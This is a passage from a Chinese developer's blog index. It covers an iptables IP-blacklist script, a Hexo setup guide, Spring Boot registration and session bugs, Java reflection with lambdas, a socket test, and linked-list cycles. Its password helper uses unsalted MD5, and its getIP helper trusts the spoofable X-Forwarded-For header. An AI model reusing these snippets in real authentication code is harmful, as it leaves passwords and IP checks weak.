$THRESHOLD 的 IPecho &quot;筛选频率超过 $THRESHOLD 的 IP&quot;blacklist_ips=()for ip in &quot;$&#123;!ip_counts[@]&#125;&quot;; do  if [[ $&#123;ip_counts[&quot;$ip&quot;]&#125; -gt $THRESHOLD ]]; then    blacklist_ips+=(&quot;$ip&quot;)  fidone# 去重并添加到黑名单文件echo &quot;将 IP 添加到黑名单文件并去重&quot;for ip in &quot;$&#123;blacklist_ips[@]&#125;&quot;; do  if ! grep -q &quot;^$ip$&quot; &quot;$BLACKLIST_FILE&quot;; then    echo &quot;$ip&quot; &gt;&gt; &quot;$BLACKLIST_FILE&quot;  fidone# 一次性检查哪些 IP 已经在防火墙中，过滤掉已存在的 IPexisting_ips=$(iptables -L $CHAIN_NAME -v -n | grep -oP &#x27;\\b(?:[0-9]&#123;1,3&#125;\\.)&#123;3&#125;[0-9]&#123;1,3&#125;\\b&#x27; | sort -u | grep -v &#x27;^0\\.0\\.0\\.0$&#x27;)# 遍历黑名单 IP，添加到防火墙中echo &quot;更新防火墙黑名单规则&quot;for ip in &quot;$&#123;blacklist_ips[@]&#125;&quot;; do  if echo &quot;$existing_ips&quot; | grep -wq &quot;^$ip$&quot;; then    echo &quot;IP 已在防火墙中：$ip&quot;  else    echo &quot;添加黑名单规则：$ip&quot;    iptables -A $CHAIN_NAME -s &quot;$ip&quot; -j DROP  fidoneecho &quot;防火墙规则更新完成！&quot;\n\n*/10 * * * * bash /home/ubuntu/frp/blacklist.sh &gt;&gt; /home/ubuntu/frp/blacklist.log 2&gt;&amp;1\n\n\n2&gt;&amp;1：将标准错误（stderr）重定向到标准输出，这样标准错误也会被追加到同一个日志文件中。\n\n\n\n\n名称\n代码\n操作符\n\n\n\n标准输入(stdin)\n0\n&lt; 或 &lt;&lt;\n\n\n标准输出(stdout)\n1\n&gt;,&gt;&gt;,1&gt; 或 1&gt;&gt;\n\n\n标准错误输出(stderr)\n2\n2&gt; 或 2&gt;&gt;\n\n\n","categories":["编程记录"],"tags":["网络安全","云服务器","防火墙"]},{"title":"使用hexo框架在github.io上搭建博客网站.","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8hexo%E6%A1%86%E6%9E%B6%E5%9C%A8github-io%E4%B8%8A%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/","content":"安装相关软件安装gitGit是一个开源的分布式版本控制系统，可以有效、高速地处理从很小到非常大的项目版本管理。也是Linus Torvalds为了帮助管理Linux内核开发而开发的一个开放源码的版本控制软件。据说他开发git只花了两周时间，大佬不愧是大佬。git官网windows：到git官网上下载，下载后会有一个Git Bash的命令行工具，用这个工具就可以使用git了。linux：因为开发git就是为了管理linux内核开发的，所以linux的非常简单，只需要下面这行代码\nsudo apt-get install git\n当然你像我一样使用IDE自动安装安装完成后，可以使用git --version查看版本\n安装nodejs因为Hexo是基于nodeJS编写的，所以需要安装一下nodejs和里面的npm工具。windows：到nodejs下载地址，选择LTS版本（稳定版本）就行了。linux：使用以下命令\nsudo apt-get install nodejssudo apt-get install npm\n安装完后，使用node -v 和 npm -v 查看版本\n安装hexo可以参考官方文档，真的非常好用所有必备的应用程序（git和nodejs）安装完成后，即可使用 npm 安装 Hexo。全局安装\nnpm install -g hexo-cli\n\n关于github pages可以参考官方文档\n创建github仓库新建一个名字为username.github.io的仓库仓库名必须为username.github.io，否则不会被github识别。其中username为github账户的用户名。\n生成ssh添加到github（如果之前没有添加过的话）在git bash中，配置账户信息\ngit config --global user.name &quot;yourname&quot;git config --global user.email &quot;youremail&quot;\n这里的yourname为GitHub用户名，youremail为GitHub的邮箱。不要瞎写，不然无法push到github\n可以查看配置的信息。以防写错\ngit config user.namegit config user.email\n然后创建SSH，一路回车。\nssh-keygen -t rsa -C &quot;youremail&quot;\n创建完成后，会生成C:\\Users\\Username.ssh文件夹其中id_rsa是生成的私钥，id_rsa.pub是生成的公钥。将id_rsa.pub用记事本打开，复制其内容，添加到github的设置中。添加完成后，在gitbash中查看是否添加成功\nssh -T git@github.com\n成功会有 Hi username&#x2F;username.github.io! You’ve successfully authenticated, but GitHub does not provide shell access. 这句话。\n关于hexohexo的初始化前面给的官方文档也包含了hexo的配置，以及命令等其他相关的功能。 所以这里就简单写一下。执行下列命令，Hexo将会在当前目录的指定文件夹中新建所需要的文件，请确保指定文件夹为空。\nhexo init &lt;folder&gt;cd &lt;folder&gt;npm install\n新建完成后，指定文件夹下会生成一些文件，其中：_config.yml——hexo的配置文件package.json——应用程序信息scaffolds——模板文件夹，创建文章时，会根据模板来创建source——资源文件夹，写的markdown和图片资源什么的都在这themes——主题文件夹，比如我在使用的butterfly主题就放在这\n将hexo部署到GitHub将hexo生成的文章部署到GitHub上打开hexo配置文件 _config.yml，翻到最后，修改deploy其中YourgithubName是你的GitHub账户，branch是分支，一般设置为main或者master\ndeploy:    type: git    repo: https://github.com/YourgithubName/YourgithubName.github.io.git    branch: master\n修改完后，需要先安装deploy-git（部署的命令），这样才能用命令部署到GitHub。\nnpm install hexo-deployer-git --save\n之后是hexo的部署命令\nhexo cleanhexo generatehexo deploy\n其中 hexo clean 清除了你之前生成的东西。hexo generate 生成静态文章，可以用 hexo g缩写hexo deploy 部署文章，可以用hexo d缩写hexo generate 和 hexo deploy 也可以合并写成 hexo g -d 或者 hexo d -g\n出现 INFO  Deploy done: git 时，说明部署成功了。稍微等一会，便可以在 https://yourname.github.io 这个网站看到你的博客了，其中yourname是github的用户名。刷新显示404，请不要着急。心急吃不了热豆腐\n到这里，使用hexo在github.io上搭建博客网站就成功了。就可以开始写博客了。但，是不是有点单调。所以我们可以使用主题来装饰他，来实现更多的功能。 github官方建议你使用博客生成工具 Jekyll。\n关于hexo的主题butterfly可以参考官方安装文档\n安装butterfly在hexo的根目录里github：\ngit clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly\ngitee：\ngit clone -b master https://gitee.com/immyw/hexo-theme-butterfly.git themes/butterfly\n应用主题修改 Hexo 根目录下的 _config.yml，把主题改为butterfly\ntheme: butterfly\n安裝插件如果你沒有 pug 以及 stylus 的渲染器，請下載安裝：\nnpm install hexo-renderer-pug hexo-renderer-stylus --save\nbutterfly的相关配置相关配置请看文档，有详细的解释。在此不作赘述。\n可能会产生的错误错误的原因可能很多，解决方法并不一定有用。在这里列出我碰到的问题。因为github连接不稳定，所以要有耐心。\nOpenSSL SSL_read: Connection was aborted, errno 10053原因Git默认限制推送的大小，运行命令更改限制大小解决方法\ngit config --global http.postBuffer 524288000\nFailed to connect to github.com port 443: Timed out原因代理的设置问题解决方法：进入项目目录中，使用命令行取消代理设置：\ngit config --global --unset http.proxygit config --global --unset https.proxy","categories":["学习笔记"],"tags":["hexo"]},{"title":"关于Schiphalast注册功能开发中的bug","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E5%85%B3%E4%BA%8ESchiphalast%E6%B3%A8%E5%86%8C%E5%8A%9F%E8%83%BD%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84bug/","content":"简介这个功能写成了一个springboot项目，部署在taptap的云引擎上。taptap云引擎官方文档使用了官方提供的命令行工具，创建项目和部署到云引擎。命令行文档他生成的项目实际是springboot的改版，添加了一些他们独有的功能。比如云函数等。实际开发与平时一致（他们提供的功能其实基本没用到，或许以后会用到。\n另外，要吐槽的一个点就是：项目生成默认配置使用的是Java11，但是部署到云引擎时，报错。换成Java8后正常运行。版本问题，影响不大。新版任你发，我用Java 8。\n可复用模块从请求中获取ip地址Remote Address：Remote Address代表HTTP请求的远程地址，即请求的源地址。http协议在三次握手时时用的就是这个Remote Address地址，发送响应报文时也是使用的这个Remote Address地址。所以，Remote Address地址是不能伪造的，否则请求者会收不到响应报文。\n\n但是，http请求经过代理服务器转发时，用户真实ip会丢失。所以有了X-Forwarded-For获取ip的方式。\n\nX-Forwarded-For：为了避免真实ip的丢失，代理服务器会增加叫X-Forwarded-For的头信息。将客户端ip记录到其中，以保证服务器可以获取到客户端真实ip。X-Forwarded-For是一个拓展头。虽然HTTP&#x2F;1.1（RFC 2616）协议并没有对它的定义，但它已经成为事实上的标准（都在用X-Forwarded-For请求头格式：X-Forwarded-For: client, proxy1, proxy2第一个便是请求的原始ip，后面则是代理服务器的ip。\n\n由于请求头可以伪造，所以不要相信请求头中携带的ip信息。\n\n\n直接对外提供服务的 Web 应用，在进行与安全有关的操作时，只能通过 Remote Address 获取 IP，不能相信任何请求头；使用 Nginx 等 Web Server 进行反向代理的 Web 应用，在配置正确的前提下，要用 X-Forwarded-For 最后一节 或 X-Real-IP 来获取 IP（因为 Remote Address 得到的是 Nginx 所在服务器的内网 IP）；同时还应该禁止 Web 应用直接对外提供服务；在与安全无关的场景，例如通过 IP 显示所在地天气，可以从 X-Forwarded-For 靠前的位置获取 IP，但是需要校验 IP 格式合法性；\n\n参考文章：关于X-Forwarded-For的介绍HTTP 请求头中的 X-Forwarded-For\n代码：\n/** * 从HttpServletRequest中获取ip * @param request 请求 * @return ip */public static String getIP(HttpServletRequest request) &#123;    String ip = request.getHeader(&quot;x-forwarded-for&quot;);    if (ip == null || ip.length() == 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;        ip = request.getHeader(&quot;Proxy-Client-IP&quot;);    &#125;    if (ip == null || ip.length() == 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;        ip = request.getHeader(&quot;X-Forwarded-For&quot;);    &#125;    if (ip == null || ip.length() == 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;        ip = request.getHeader(&quot;WL-Proxy-Client-IP&quot;);    &#125;    if (ip == null || ip.length() == 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;        ip = request.getHeader(&quot;X-Real-IP&quot;);    &#125;    if (ip == null || ip.length() == 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;        ip = request.getRemoteAddr();        if (&quot;127.0.0.1&quot;.equalsIgnoreCase(ip) || &quot;0:0:0:0:0:0:0:1&quot;.equalsIgnoreCase(ip)) &#123;            // 根据网卡取本机配置的 IP            InetAddress iNet = null;            try &#123;                iNet = InetAddress.getLocalHost();            &#125; catch (UnknownHostException e) &#123;                e.printStackTrace();            &#125;            if (iNet != null)                ip = iNet.getHostAddress();        &#125;    &#125;    // 对于通过多个代理的情况，分割出第一个 IP    if (ip != null &amp;&amp; ip.length() &gt; 15) &#123;        if (ip.indexOf(&quot;,&quot;) &gt; 0) &#123;            ip = ip.substring(0, ip.indexOf(&quot;,&quot;));        &#125;    &#125;    return &quot;0:0:0:0:0:0:0:1&quot;.equals(ip) ? &quot;127.0.0.1&quot; : ip;&#125;\n\n密码的md5加密MD5，全称 消息摘要算法第五版（Message Digest Algorithm 5）不多介绍，详见MD5百度百科\n关于加密算法的改进：\n\n加盐 即在原来的明文中加入一组随机串，再通过加密算法加密，将密文存入数据库。\n加次数 即多加密几次，增加破解难度。不过会消耗更多计算资源。\n\njdk自带api：\n/** * md5加密 * @param password 需要加密的字符串 * @return 加密后的字符串 */public static String md5(String password)&#123;    String hashedPwd = null;    try &#123;        //生成MessageDigest对象，指定使用的消息摘要算法        MessageDigest md = MessageDigest.getInstance(&quot;MD5&quot;);        //传入需要计算的字符串，传入参数为字节或字节数组        md.update(password.getBytes());        /*        digest()计算消息摘要，返回值为字节数组。16个字节，128bit        通过BigInteger将其转换成32位的16进制数（每个字节用两个16进制数表示）        或者16位16进制数，去掉32位前后各8位         */        hashedPwd = new BigInteger(1, md.digest()).toString(16);    &#125; catch (NoSuchAlgorithmException e) &#123;        e.printStackTrace();    &#125;    return hashedPwd;&#125;\n\nspring的DigestUtils工具类\npublic static String md5(String password) &#123;    // 基于spring框架中的DigestUtils工具类进行密码加密    return DigestUtils.md5DigestAsHex((password).getBytes());&#125;\n\n发送mail邮件使用JavaMail发送邮件\n依赖：\n&lt;!--javamail的依赖--&gt;&lt;dependency&gt;    &lt;groupId&gt;javax.mail&lt;/groupId&gt;    &lt;artifactId&gt;mail&lt;/artifactId&gt;    &lt;version&gt;1.4.7&lt;/version&gt;&lt;/dependency&gt;\n代码：\n//邮件服务器地址（比如smtp.qq.comprivate static final String mailHost = null;//邮件传输协议（通常为smtpprivate static final String mailTransportProtocol = &quot;smtp&quot;;//邮箱认证（即登录private static final String mailSmtpAuth = &quot;true&quot;;//发件人邮箱地址private static final String fromEmail = null;//发件人邮箱密码private static final String password = null;/** * 发送邮件 * @param toEmail 发往邮箱地址 */public static void sendMail(String toEmail)&#123;    //发送的内容（可以是dom文档    String sendContent = &quot;test mail&quot;;    //创建，发送邮件    Properties prop = new Properties();    prop.setProperty(&quot;mail.host&quot;, mailHost);    prop.setProperty(&quot;mail.transport.protocol&quot;, mailTransportProtocol);    prop.setProperty(&quot;mail.smtp.auth&quot;, mailSmtpAuth);    //使用JavaMail发送邮件的5个步骤    //1、创建session    Session session = Session.getInstance(prop);    //2、通过session得到transport对象    Transport ts;    try &#123;        ts = session.getTransport();        //3、使用邮箱的用户名和密码连上邮件服务器，发送邮件时，发件人需要提交邮箱的用户名和密码给smtp服务器，用户名和密码都通过验证之后才能够正常发送邮件给收件人。        ts.connect(mailHost, fromEmail, password);        //4、创建邮件        MimeMessage message = new MimeMessage(session);        //指明邮件的发件人        message.setFrom(new InternetAddress(fromEmail));        //指明邮件的收件人        message.setRecipient(Message.RecipientType.TO, new InternetAddress(toEmail));        //邮件的标题        message.setSubject(&quot;标题&quot;);        //邮件的文本内容        message.setContent(sendContent, &quot;text/html;charset=UTF-8&quot;);        //5、发送邮件        ts.sendMessage(message, message.getAllRecipients());        ts.close();    &#125; catch (MessagingException e) &#123;        e.printStackTrace();    &#125;&#125;\n\n参考文章：使用JavaMail创建邮件和发送邮件\n\n使用springboot集成的mail模块\n依赖：\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-mail&lt;/artifactId&gt;&lt;/dependency&gt;\n配置：\nspring.mail.protocol=spring.mail.host=spring.mail.username=spring.mail.password=\n代码：\n@Resourceprivate JavaMailSender javaMailSender;@Value(&quot;$&#123;fromEmail&#125;&quot;)private String fromEmail;/** * 发送邮件 * @param toEmail 发往邮箱地址 */public static void sendMail(String toEmail)&#123;    //发送的内容（可以是dom文档    String sendContent = &quot;test mail&quot;;    try &#123;        MimeMessageHelper messageHelper = new MimeMessageHelper(javaMailSender.createMimeMessage(), true);        messageHelper.setFrom(fromEmail);        messageHelper.setTo(toEmail);        messageHelper.setSubject(&quot;标题&quot;);        messageHelper.setText(sendContent, true);        javaMailSender.send(messageHelper.getMimeMessage());    &#125; catch (MessagingException e) &#123;        e.printStackTrace();    &#125;&#125;\n\njdbc数据库连接池（鸽了）因为建立数据库连接与关闭数据库连接是非常耗时的事情，如果每次查询都建立连接、关闭连接会产生很大的性能开销。所以有了连接池的出现来解决这一问题。即在程序启动时，初始化连接池（连接数据库，创建多个连接）。在需要使用时从连接池中获取连接，使用结束放回连接池。以减少性能开销。\n代码：\n先鸽了\n\n附DataSource的产出背景：DataSource，一个被严重低估的接口\nbug及解决方案session变化现象ajax请求及其余请求在前几次请求时，session会发送变化。导致存在session中的数据获取不到。\n原因通过HttpServletRequest获取session对象时，使用 request.getSession() 方法。getSession方法会检测当前是否有session存在，默认不存在会创建一个新的session，存在则返回。\najax请求跨域请求默认不携带cookie信息。即获取不到session\n解决方案（未解决）调用getSession方法时传入参数false或true例如：request.getSession(false);为true时，先查看请求时是否有sessionID。如果没有，则创建一个新的session对象。如果有则根据sessionID查找对应的session对象，找到了就返回该session对象，没找到就创建新的session对象。为false时，先查看请求中是否有sessionID，没有则返回null。有则根据sessionID查找对应的session对象，找到了就返回该session对象，没找到就创建新的session对象。默认为true\n建议：往session中写入参数时使用 request.getSession();从session中读取参数时使用 request.getSession(false);\n附session其他操作：设置值：session.setAttribute(String name,Object obj);读取值：session.getAttribute(String name);删除session：session.invalidate();\n\n让ajax请求携带参数添加属性：xhr.withCredentials=true\n附js原生实现ajax请求：var Ajax = &#123;        get: function (url, callback) &#123;            // XMLHttpRequest对象用于在后台与服务器交换数据            var xhr = new XMLHttpRequest();            xhr.open(&#x27;GET&#x27;, url, false);            xhr.onreadystatechange = function () &#123;                // readyState == 4说明请求已完成                if (xhr.readyState == 4) &#123;                    if (xhr.status == 200 || xhr.status == 304) &#123;                        console.log(xhr.responseText);                        callback(xhr.responseText);                    &#125;                &#125;            &#125;            xhr.send();        &#125;,        // data应为&#x27;a=a1&amp;b=b1&#x27;这种字符串格式，在jq里如果data为对象会自动将对象转成这种字符串格式        post: function (url, data, callback) &#123;            var xhr = new XMLHttpRequest();            xhr.open(&#x27;POST&#x27;, url, false);            // 跨域携带cookie            xhr.withCredentials=true            // 添加http头，发送信息至服务器时内容编码类型            xhr.setRequestHeader(&#x27;Content-Type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;);            xhr.onreadystatechange = function () &#123;                if (xhr.readyState === 4) &#123;                    if (xhr.status === 200 || xhr.status === 304) &#123;                        // console.log(xhr.responseText);                        callback(xhr.responseText);                    &#125;                &#125;            &#125;            xhr.send(data);        &#125;    &#125;说明：这个bug其实并未解决，因为部署到tap云引擎时，是一个springboot项目。所有的请求应该都是同源的，不会出现跨域的情况。而session变化原因，就是getSession会创建新的session对象。将getSession传入false，同时改完ajax属性后，这个bug依旧会出现。在部署到生产环境后，依旧有用户偶尔会出现了session为null的情况。\n\n2022-08-12 暂未解决。\n\n总结第一次使用平台提供的自动化的部署和管理功能。有部署状态（预备环境和生产环境）、请求统计、日志、及环境变量各种设置等。taptap云服务还是很成熟的。相比自己在腾讯云服务器上使用要方便很多，不管是部署还是监控。官方文档也相对很齐全，参看文档来使用是完全可以的。\n","categories":["编程记录"],"tags":["java","session","bug","MD5","ip","mail","数据库连接池"]},{"title":"关于使用反射时，因lambda产生的bug","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E5%85%B3%E4%BA%8E%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%B0%84%E6%97%B6%EF%BC%8C%E5%9B%A0lambda%E4%BA%A7%E7%94%9F%E7%9A%84bug/","content":"场景在做动态权限控制时，需要在项目启动时加载权限列表，写入数据库。以供拦截器去鉴权。这里的权限列表是接口的路径，即权限细到每一个接口。所以，需要使用反射获取接口的路径。然后拦截器通过用户角色获取到权限列表（可访问的接口路径）后，去匹配当前请求的路径。以达到权限控制的目的。\n问题及解决过程前面都很顺利啊，接口路径在项目启动初始化后，成功写入数据库。因为此时的接口是我用 MybatisPlus 的模板生成器生成的，比较简单。当接口查表，处理数据时。有些复杂了，开始使用 lambda 和 stream 流来处理查询结果。（真的很好用兴高采烈的写完，运行项目。初始化权限的地方（通过反射获取接口路径的方法）报了 空指针异常（NPE）。\n这个时候我的第一反应是：我是不是什么地方注解写漏了。因为具体报 NPE 的地方是 @Operation(summary &#x3D; “…”) 注解的 summary 属性。（swagger3 的注解）于是我打印了通过反射获取的方法的路径，因为 controller 层的方法上都有 RequestMapping 之类的注解用来映射请求的路径。我一个 controller 里就增删改查四个方法，打印出来六个，有俩空的。难道还有幽灵方法不成。\n于是打印了路径为空的方法看看。结果如下：\n看到 lambda ，突然就开朗了。最后给 @Operation 做了个空判断，只将有这个注解的方法的路径写入数据库。（文档上没有的，不在权限管理里。也很合理\n关于 lambda 的问题问题解决了，下面就是深入一下为什么。\n其实，很简单。看一下下面的代码和运行结果就知道了。（其实上面打印出来就已经知道了\npublic class Test &#123;    public static void main(String[] args) &#123;        Class&lt;?&gt; cl1 = Lambda.class;        Method[] methods = cl1.getDeclaredMethods();        for (Method method : methods) &#123;            System.out.println(method);        &#125;        System.out.println(&quot;----------------------&quot;);        for (Method method : cl1.getMethods()) &#123;            System.out.println(method);        &#125;    &#125;&#125;class Lambda &#123;    public void lambda1() &#123;        System.out.println(&quot;lambda1 test method&quot;);    &#125;    public void lambda2() &#123;        Runnable lambda2 = () -&gt; System.out.println(&quot;lambda2 test method&quot;);        lambda2.run();·    &#125;&#125;\n\n结果：\npublic void com.xiamo.wowmsbackend.Lambda.lambda2()private static void com.xiamo.wowmsbackend.Lambda.lambda$lambda2$0()public void com.xiamo.wowmsbackend.Lambda.lambda1()----------------------public void com.xiamo.wowmsbackend.Lambda.lambda2()public void com.xiamo.wowmsbackend.Lambda.lambda1()public final void java.lang.Object.wait(long,int) throws java.lang.InterruptedExceptionpublic final void java.lang.Object.wait() throws java.lang.InterruptedExceptionpublic final native void java.lang.Object.wait(long) throws java.lang.InterruptedExceptionpublic boolean java.lang.Object.equals(java.lang.Object)public java.lang.String java.lang.Object.toString()public native int java.lang.Object.hashCode()public final native java.lang.Class java.lang.Object.getClass()public final native void java.lang.Object.notify()public final native void java.lang.Object.notifyAll()进程已结束,退出代码0\n\n可以看出 lambda 是这个类的私有静态方法。（至少编译成 class 之后，是这样的\n详细的反编译结果可以看这篇文章：深入底层原理—带你看透Lambda表达式的本质\nEND反射很好用，但也要注意。做一些判断只拿需要的。lambda 很好用，已经离不开了。（包括 stream 流\n","categories":["编程记录"],"tags":["lambda","bug","反射"]},{"title":"关于健康码识别的网站开发进度记录","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E5%85%B3%E4%BA%8E%E5%81%A5%E5%BA%B7%E7%A0%81%E8%AF%86%E5%88%AB%E7%9A%84%E7%BD%91%E7%AB%99%E5%BC%80%E5%8F%91%E8%BF%9B%E5%BA%A6/","content":"关于这个网站这个网站是大创项目的网站。用于健康码识别，目前什么都没有，只有一个空项目。啊，对，没错。github仓库地址  \n关于网站的架构网站前端打算使用vue，前端由青虬负责编写网站后端打算使用springboot，由我负责项目核心功能由顾のEvery Day负责，他也是这个项目的负责人（组长）。 图像识别那块，我暂时还不是很懂啦，反正很厉害就对了前后端肯定是要分离的，使用ajax，数据格式使用json。 jsp不分离属实痛苦后端与图像识别的python程序，目前打算使用socket（套接字）进行通信。 目前只是了解过，还需要学习而且临近期末，springboot暂时还没学完，所以开发进度在七月前估计会很慢。 可能根本没有进度  \n目前进度：确认大体需求\n\n2022-05-21周六，楼下的广场舞很吵。\n\n数据库设计数据库设计了四张表，老师、学生、权限、班级因为需求比较简单，比如权限暂时只有两种——能否查看统计信息，所以并没有采取复杂的角色和权限表。同时因为对学院和专业没有什么明确的实际操作，所以写在了班级中，并未单独分表。关于学生健康码信息的表，目前计划动态新建表，即每天新建一张表用于存储健康码的相关信息\n目前进度：创建数据库，搭建项目基本配置\n\n2022-07-05果然七月前完全没有进度，紧张的期末也终于是结束了。python实训（网课）开始了。（还有几门成绩还不出，是不打算出了吗）\n\n具体开发过程注册部分（未完成注册部分使用邮箱进行验证，使用到了springboot自带的mail组件。还挺好用的，和之前使用的javax.mail的大体流程（邮件的设置之类的）是一样的。同时也决定使用redis数据库，来解决同一用户使用不同浏览器或设备来进行邮件验证的数据共享问题。比之前采取静态类存取sessionId的方式会好一些。最后，在发送邮件的调试过程中，我也决定使用日志来打印一些信息，进行排错，而非System.out.println()。  \n目前进度：大概完成了注册的三分之一。\n\n2022-07-08今天也算是见证历史了，日本前首相安倍晋三今天中午遇刺，下午宣布死亡。考虑以后可以给博客添加上类似历史上的今天这类tips。应该会有意义吧  \n\n老师注册部分（基本完成注册的流程大概如下：  \n\n发送注册请求\n生成验证码，将验证码同用户信息一起写入redis，发送验证邮件\n访问验证链接\n验证验证码是否正确\n正确则修改redis中的数据，将用户改为在线状态，用户邮箱写入cookie，同时修改它们的生命周期（方便后期登录使用），发送注册成功的邮件，写入数据库\n错误则返回错误信息\n\n\n\nredis中缓存的信息也从原来的string改成了hash，因为考虑到登录会使用，所以缓存中用户信息得记录详细。关于验证的链接，返回的是html页面，使用的是thymeleaf，其实不太想用的，但总不能返回个json数据吧。因为页面显示完信息后，应该会3s后跳转到首页。比jsp方便了一些吧。（暂时没有好的处理方式最后就是关于Controller层和Service层的一些想法。业务层应该把这个请求分解成一个个服务，不同的请求也可以重用服务，提高代码的复用性。dao层就只做与数据库的交互。对于Controller层和Service层的划分和设计，目前设计的还不是很好。得多写多看吧。  \n\n2022-07-10脑子有点乱，去睡会觉。想把个人介绍写写，但还没想好怎么写。\n\n重新设计想了想，现在的注册虽然完成了，但是过于复杂。在邮件里嵌入链接进行验证是一个不太聪明的行为。所以决定重新设计下使用流程：  \n\n注册\n输入图片验证码，发送带有验证码的邮件。  \n同一页面，输入邮件的验证码提交后。即注册完成\n\n\n登录\n账号，密码，图片验证码。  \n正确则登陆成功\n\n\n忘记密码\n输入图片验证码，发送带有验证码的邮件。\n同一页面，输入邮件的验证码以及新密码提交后。即重置完成\n\n\n\n顺带把接口写好，需要什么，返回什么得提前规划好。\n\n2022-07-11脑子不是一般的乱，之前的设计问题很大。虽然也不是不能实现。好的设计会让程序更加简洁高效，接口写了一部分，先实现这部分。\n\n被大佬推荐了两个工具自动生成api文档的swagger包，经过一番调试，终于能正常的扫描到controller中的所有api了。后面要使用他的注解来使生成的api更详细。还有个就是Apifox，可以模拟各种请求，方便了调试。同时，也支持将swagger生成的api数据导入。也可以多人协同开发。应该会蛮好用的。  \n\n2022-07-11晚上补充，重构真痛苦啊。在博客上写的接口文档就不用了，不如软件生成的。害，亏我写了蛮久的\n\n注册功能，重新写好了。比之前的逻辑简单了许多。重置密码的流程和注册是一样的，也方便后面开发。使用spring-session-data-redis。把数据存到session中，session把数据存到redis，实现数据共享。（不存redis问题好像也不大，因为改变了设计，不在邮件中夹杂链接，所以不需要考虑用户不同源访问的数据共享问题。这个依赖包是解决分布式session共享的问题的，用在这感觉没啥必要，纯session存储就足够了。不过都写好了也无所谓了）  \n\n2022-07-13昨天忘写了。python实训布置了最后的大作业，就做个东西交上去，也没什么限制。我到现在也没想好要做啥，这几天要暂停去写大作业了。\n\n注册，登录，重置的接口基本实现了，但是没有完整的测试。昨天试着写了上传图片的模块，还行，能上传，问题不大。后面要考虑如何和python程序进行数据交互了。所以暂时缓一缓，因为负责python的人跑去上夜班了，没啥时间交流。所以这几天先学学nginx吧。后面部署还是我。nginx看完再考虑别的。  \n\n2022-07-20python实训的大作业交了个qq机器人，也不知道老师能不能跑起来。等python熟练点了，把qq机器人的配置和部署记录下。\n\n测试socketjava客户端：\npackage org.example;import java.io.InputStream;import java.io.OutputStream;import java.net.Socket;public class Client &#123;    public static void main(String args[]) &#123;        // 要连接的服务端IP地址和端口        String host = &quot;124.222.100.205&quot;;        int port = 55533;        // 与服务端建立连接        Socket socket = new Socket(host, port);        // 建立连接后获得输出流        OutputStream outputStream = socket.getOutputStream();        String message = &quot;你好 socket test1!&quot;;        socket.getOutputStream().write(message.getBytes(&quot;UTF-8&quot;));        //通过shutdownOutput高速服务器已经发送完数据，后续只能接受数据        socket.shutdownOutput();        InputStream inputStream = socket.getInputStream();        byte[] bytes = new byte[1024];        int len;        StringBuilder sb = new StringBuilder();        while ((len = inputStream.read(bytes)) != -1) &#123;            //注意指定编码格式，发送方和接收方一定要统一，建议使用UTF-8            sb.append(new String(bytes, 0, len, &quot;UTF-8&quot;));        &#125;        System.out.println(&quot;get message from server: &quot; + sb);        inputStream.close();        outputStream.close();        socket.close();    &#125;&#125;\npython服务端：\nimport sockethost = &#x27;0.0.0.0&#x27;port = 55533try:    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.bind((host, port))      s.listen(1) except socket.error:    print(&#x27;create socket failed&#x27;)print(&#x27;socket created&#x27;)while 1:    conn, addr = s.accept()    print(&quot;from&quot; + str(addr))    while 1:        data = conn.recv(1024)        if len(data) == 0:            conn.send(&#x27;end&#x27;.encode())        else:            print(data.decode())            conn.send(&#x27;end&#x27;.encode())        break    conn.close()\n\n客户端报错：Connection timed out: connect原因：服务器端口未开放\n客户端报错：Connection refused: connect原因：服务端监听端口为 127.0.0.1:55533，但127.0.0.1表示本机地址，即客户端与服务端同时运行在这台服务器上才能进行连接。所以需要绑定到网卡的ip，或者使用0.0.0.0绑定到所有的网络地址。\n\n2022-07-30\n\nsocket通信，也许会使用队列，一个个发给python端。但这样好像效率不高。另一种方式是采取类似数据库连接池的方法，或者多线程。\n\n2022-08-01讨论了一下，边写边想吧。\n\n结束一句话，寄了。\n","categories":["编程记录"],"tags":["java","socket","SpringBoot"]},{"title":"单链表环问题","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%8E%AF%E9%97%AE%E9%A2%98/","content":"题目和前置给出一个单链表，判断是否有环。如果有环，则返回环入口和环长度。\n单链表节点结构\npackage LinkedList;public class Node &#123;    public Integer data;    public Node next;    public Node() &#123;        this.data = null;        this.next = null;    &#125;    public Node(int value) &#123;        this.data = value;        this.next = null;    &#125;&#125;\n\n随机环链表的对数器\n/** * 生成环链表（入口随机） * @return 返回链表头节点 */private Node getRingLinkedList()&#123;    Node head = new Node();    Node next = head;    Random random = new Random();    int rand = random.nextInt(100);    Node r = null;    for (int i = 0; i &lt; 100; i++) &#123;        next.next = new Node(random.nextInt(50));        next = next.next;        if (i == rand) &#123;            r = next;        &#125;    &#125;    next.next = r;    System.out.println(&quot;环入口：&quot;+r);    System.out.println(&quot;环入口数据：&quot;+r.data);    return head;&#125;\n\n使用辅助空间的解法使用辅助空间存储节点地址，如果有重复的，则第一次出现重复的即为环的入口环长度为重复元素出现位置的差\n时间复杂度为 O(n)空间复杂度也为 O(n)\n代码实现：\n/** * 判断一个链表是否有环，并返回环的入口 * 使用 List集合 存储节点，第一次出现重复节点即为环的入口 */public static Node findLoopPort1(Node head) &#123;    Node next = head.next;    List&lt;Node&gt; list = new ArrayList&lt;Node&gt;();    while 